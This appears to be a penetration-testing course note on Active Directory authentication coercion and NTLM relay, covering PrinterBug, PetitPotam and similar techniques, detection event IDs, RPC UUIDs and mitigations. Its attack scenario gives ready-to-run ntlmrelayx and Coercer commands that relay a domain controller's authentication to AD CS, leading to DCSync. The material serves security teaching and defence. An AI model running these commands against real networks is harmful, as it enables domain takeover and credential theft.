---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.01 Authentication Coercion Overview"
---

# Authentication Coercion Overview

## Introduction
Authentication coercion is a formidable category of attacks within Microsoft Active Directory environments. It involves an attacker manipulating or "coercing" a target machine (often a high-value asset such as a Domain Controller, Exchange Server, or file server) into authenticating to an attacker-controlled machine. When the target attempts to authenticate, the attacker intercepts the authentication attempt and relays it to a third system, thereby impersonating the coerced machine.

Historically, NTLM relay attacks relied on passive interception techniques—such as LLMNR, NBT-NS, and mDNS poisoning using tools like Responder. While effective, these techniques required the attacker to patiently wait for broadcast traffic or for a user to mistype a share name. Authentication coercion fundamentally changed this paradigm. Instead of waiting for authentication, attackers actively force systems to authenticate on demand using specific built-in Microsoft Remote Procedure Call (MS-RPC) methods.

This overview covers the underlying mechanics of authentication coercion, the evolution of these attacks, how MS-RPC facilitates them, and the defensive strategies required to secure an enterprise network against such threats.

## Evolution of NTLM Relay and Coercion
The roots of NTLM relay trace back over a decade, but the advent of coercion attacks represented a paradigm shift in Active Directory exploitation.

1. **Passive Relaying (Pre-2018):** Relaying was largely opportunistic. Attackers used broadcast poisoning to capture NTLM authentication from administrative users.
2. **The PrinterBug Era (2018):** The discovery of the "PrinterBug" (MS-RPRN) demonstrated that an attacker could force a machine running the Print Spooler service to authenticate to any arbitrary IP address. This allowed instant coercion of Domain Controllers, leading to rapid forest compromise via Resource-Based Constrained Delegation (RBCD) or unconstrained delegation.
3. **The PetitPotam Era (2021):** Microsoft eventually provided guidance on disabling the Print Spooler on DCs, but in 2021, PetitPotam emerged, leveraging the MS-EFSRPC protocol. Unlike PrinterBug, PetitPotam did not require prior authentication in some environments, allowing an unauthenticated attacker to coerce a DC and relay to Active Directory Certificate Services (AD CS) for instant domain admin.
4. **Subsequent Discoveries (2022-Present):** Security researchers mapped out numerous other RPC interfaces, resulting in tools like ShadowCoerce (MS-FSRVP) and DFSCoerce (MS-DFSNM). This demonstrated that coercion is not a singular bug but a systemic design flaw in how Windows services handle remote file system or notification requests.

## Core Concepts: RPC and Named Pipes
To understand authentication coercion, one must grasp how Microsoft Remote Procedure Call (MS-RPC) functions over Server Message Block (SMB).

**MS-RPC** is a protocol that allows a program to request a service from a program located on another computer in a network. MS-RPC can use various transport protocols, but in the context of coercion, it typically operates over SMB using **Named Pipes**.

A Named Pipe is a logical connection, similar to a TCP session, used for inter-process communication (IPC). Windows uses the `IPC$` share to expose named pipes over the network. 
When an attacker communicates with an RPC endpoint:
1. They authenticate to the `IPC$` share (often with low-privileged credentials, or null sessions if allowed).
2. They bind to a specific RPC interface UUID.
3. They invoke a specific function (method) within that interface.

The vulnerability arises when an RPC function is designed to take a UNC path (e.g., `\\192.168.1.100\share`) as a parameter. The attacker provides a UNC path pointing to their own machine. The target server, executing the RPC function, attempts to access the provided UNC path to write a file, check a status, or send a notification.
To access the UNC path, the target server initiates an SMB connection (or sometimes HTTP/WebDAV) to the attacker. As part of establishing this connection, the target server attempts to authenticate using its own machine account (`TARGET$`), generating an NTLM Type 1 message.

## ASCII Diagram of Authentication Coercion & Relay Flow

```text
                                         +--------------------------+
                                         |      Target Machine      |
                                         |    (e.g., Domain Ctrl)   |
                                         |   Account: TARGET$       |
                                         +--------------------------+
                                           ^                      |
                                           |                      |
      1. Trigger RPC Function via SMB      |                      |
      (e.g., RpcRemoteFindFirstPrinter...  |                      |
       or EfsRpcOpenFileRaw)               |                      |
      Payload: UNC Path = \\ATTACKER\pipe  |                      |
                                           |                      | 2. Target initiates SMB/HTTP
                                           |                      |    connection to Attacker
                                           |                      |    and sends NTLM Type 1
                                           |                      v
+------------------------+                 |              +--------------------------+
|  Low-Privileged User   |-----------------+              |     Attacker Machine     |
|  (Attacker's Client)   |                                |  (Running NTLMRelayx)    |
+------------------------+                                +--------------------------+
                                                                  |            ^
                                       3. Attacker relays NTLM    |            | 4. Server replies
                                          Type 1 to Victim Server |            |    with NTLM Type 2
                                          (e.g., AD CS, LDAP, SMB)|            |    (Challenge)
                                                                  v            |
                                                          +--------------------------+
                                                          |      Victim Server       |
                                                          |  (e.g., AD CS Web Auth)  |
                                                          +--------------------------+
                                                                  |            ^
                                       6. Attacker relays NTLM    |            |
                                          Type 3 to Victim Server |            | 5. Attacker relays Type 2
                                          to complete auth.       |            |    to Target Machine, which
                                                                  v            |    calculates and sends Type 3
                                                          +--------------------------+
                                                          |      Victim Server       |
                                                          |      grants access       |
                                                          +--------------------------+
```

## Detailed Protocol Mechanics
When an attacker specifies `\\ATTACKER\share` in an RPC call, the underlying Windows APIs (such as `CreateFile` or `NetShareGetInfo`) invoke the Multiple Provider Router (MPR) to resolve the path. 
By default, Windows will attempt to connect using SMB (Port 445).
The authentication sequence follows the standard NTLM challenge-response protocol:
- **Negotiate (Type 1):** The coerced server sends supported features and domain information to the attacker.
- **Challenge (Type 2):** The attacker forwards the Type 1 to the final relay target, receives a Type 2 challenge from the target, and forwards this challenge back to the coerced server.
- **Authenticate (Type 3):** The coerced server encrypts the challenge using its machine account NTLM hash and sends it to the attacker. The attacker relays this final message to the target, successfully authenticating as the coerced machine.

### SMB vs. WebDAV Coercion
Attackers are not limited to coercing SMB traffic. By providing a UNC path formatted for WebDAV (e.g., `\\ATTACKER@80\share` or `\\ATTACKER@80/share`), the target machine's WebClient service (if running) will attempt to connect via HTTP. This is particularly dangerous because HTTP traffic often bypasses internal firewall rules blocking outbound SMB, and NTLM relaying from HTTP to LDAP/SMB lacks some of the strict protections (like SMB signing) present when relaying from SMB.

## Prerequisites for Authentication Coercion
For a successful coercion and relay attack, several conditions must be met:
1. **RPC Reachability:** The attacker must be able to reach the target on port 445 (SMB) or 135 (RPC Endpoint Mapper) and the specific high dynamic ports if named pipes are not used.
2. **Valid Credentials:** Most RPC endpoints require authenticated access to the `IPC$` share. Thus, the attacker typically needs at least one valid low-privileged domain user account. (Some legacy PetitPotam endpoints allowed anonymous access, but this has largely been patched).
3. **Vulnerable Service:** The target must be running the service that exposes the vulnerable RPC endpoint (e.g., Print Spooler, EFS, VSS, DFSN).
4. **Relay Target Without Mitigations:** The final destination to which the authentication is relayed must not enforce strict mitigations. For example:
    - SMB targets must have SMB Signing disabled.
    - LDAP targets must not enforce LDAP signing and channel binding.
    - HTTP targets (like AD CS web enrollment) must not enforce Extended Protection for Authentication (EPA).

## Detections and Event IDs
Detecting coercion requires monitoring both network traffic and endpoint event logs. Since these attacks leverage legitimate Microsoft protocols, distinguishing malicious coercion from administrative activity can be challenging.

### Host-Based Detections
- **Event ID 5145 (Security):** Network Share Object Checking. Look for access to specific named pipes associated with coercion (e.g., `\PIPE\spoolss`, `\PIPE\lsarpc`, `\PIPE\efsrpc`, `\PIPE\FSRVP`).
- **Event ID 4624 (Security):** Successful Logon. Monitor for anomalous logon events where a Domain Controller's machine account logs onto another server from an unexpected source IP.
- **Event ID 4625 (Security):** Failed Logon. Coercion tools often generate failed logons if the credentials used to access the RPC endpoint are invalid.
- **Sysmon Event ID 3 (Network Connection):** Monitor outbound connections on port 445 or 80 originating from the `SYSTEM` context of highly privileged servers (like DCs) to non-infrastructure IP addresses.

### Network-Based Detections (Zeek / Suricata)
- Detect DCE/RPC bind requests to specific UUIDs known for coercion.
  - PrinterBug: `12345678-1234-abcd-ef00-0123456789ab`
  - PetitPotam: `c681d488-d850-11d0-8c52-00c04fd90f7e`
  - ShadowCoerce: `a8e0653c-2744-4389-a61d-7373df8b2292`
  - DFSCoerce: `netdfs` UUID `4fc742e0-4a10-11cf-8273-00aa004ae673`

## Remediation and Mitigation
Mitigating authentication coercion requires a multi-layered defense-in-depth approach, as patching single RPC vulnerabilities does not solve the underlying architectural flaw.

1. **Disable Unnecessary Services:**
   - Disable the Print Spooler service on all Domain Controllers and servers that do not actively print.
   - Disable the Encrypting File System (EFS) service if not in use.
   - Ensure the WebClient service is disabled on critical servers to prevent WebDAV coercion.

2. **Implement RPC Filters:**
   - Use Windows RPC filters to block remote access to vulnerable RPC interfaces. This allows local processes to use the services while preventing network-based coercion.

3. **Enforce Signing and Channel Binding:**
   - **SMB Signing:** Enforce SMB signing on all workstations and servers. This prevents attackers from relaying NTLM to SMB endpoints.
   - **LDAP Signing:** Require LDAP signing and LDAP Channel Binding on Domain Controllers to prevent relaying to LDAP.
   - **Extended Protection for Authentication (EPA):** Enable EPA on IIS and other HTTP services (crucially AD CS) to prevent NTLM relay over HTTP.

4. **Network Segmentation:**
   - Block outbound SMB (port 445) from Domain Controllers to client subnets. DCs generally do not need to initiate SMB connections to random workstations.
   - Use strict Windows Firewall rules to limit which machines can interact with administrative RPC interfaces.

5. **Disable NTLM:**
   - The ultimate mitigation is to transition entirely away from NTLM towards Kerberos. Use the `Network Security: Restrict NTLM` Group Policy settings to audit and eventually block NTLM authentication across the domain.

## Troubleshooting NTLM Relay Coercion
When attempting coercion during an engagement, several issues may arise:
- **`STATUS_ACCESS_DENIED`:** The user account you are using does not have permission to access the named pipe, or the target has been patched/hardened.
- **No authentication received:** The target may have an egress firewall rule blocking outbound SMB/HTTP, or the targeted service is not running.
- **`STATUS_BAD_NETWORK_NAME`:** The `IPC$` share or named pipe is not available.
- **Relay fails with `STATUS_NOT_SUPPORTED`:** The target requires SMB signing, and your relay attempt was rejected.

## Real-World Attack Scenario

During a penetration test for an international retail chain, the attacker obtained standard domain user credentials (`jsmith`) through an initial phishing payload. To escalate privileges, the attacker decided to leverage authentication coercion against the primary Domain Controller (`DC01`). They identified that the organization heavily utilized Active Directory Certificate Services (AD CS), making the Web Enrollment endpoint (`certsrv`) a prime target for relaying.

Operating from a Kali Linux VM on the internal network (`10.10.50.100`), the attacker started an NTLM relay listener aimed at the AD CS server:

```bash
ntlmrelayx.py -t http://adcs.retail.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Next, the attacker needed to force `DC01` (`10.10.10.5`) to authenticate to their Kali VM. They utilized the `Coercer` tool, which systematically iterates through various MS-RPC methods. The attacker provided the compromised user credentials to access the IPC$ share:

```bash
coercer coerce -u 'jsmith' -p 'Welcome2023!' -d 'retail.local' -t 10.10.10.5 -l 10.10.50.100
```

`Coercer` rapidly enumerated RPC endpoints on the DC. It discovered that while the Print Spooler was disabled, the MS-EFSRPC service was still active and vulnerable to PetitPotam-style coercion via the `EfsRpcOpenFileRaw` method. The DC immediately established an outbound SMB connection to `10.10.50.100` and attempted to authenticate as `DC01$`. `ntlmrelayx.py` caught the NTLM Type 1 message, relayed it to the AD CS server, and successfully completed the handshake. The attacker received a base64-encoded certificate for the Domain Controller, which they subsequently used with Rubeus to perform a DCSync attack and dump the entire NTDS.dit.

## Chaining Opportunities
Authentication coercion is rarely an end goal. It is the catalyst for massive privilege escalation. Common chains include:
- **Coercion + AD CS Relay (ESC8):** Coercing a DC to authenticate to an AD CS web enrollment endpoint to obtain a certificate for the DC, leading to immediate domain takeover.
- **Coercion + RBCD:** Coercing a server to authenticate to an attacker-controlled LDAP endpoint, writing a Resource-Based Constrained Delegation attribute to the target's computer object, and then requesting a service ticket as an administrator.
- **Coercion + Unconstrained Delegation:** Coercing a target to connect to a machine configured with Unconstrained Delegation (which the attacker controls), allowing the attacker to capture the target's TGT.

## Related Notes
- [[02 - PrinterBug SpoolSample Exploitation]]
- [[03 - PetitPotam MS-EFSRPC Deep Dive]]
- [[04 - ShadowCoerce MS-FSRVP Exploitation]]
- [[05 - DFSCoerce MS-DFSNM Exploitation]]
- [[20 - NTLM Relay Attacks Overview]]
- [[25 - Active Directory Certificate Services (AD CS) Exploitation]]
- [[30 - Resource-Based Constrained Delegation (RBCD)]]
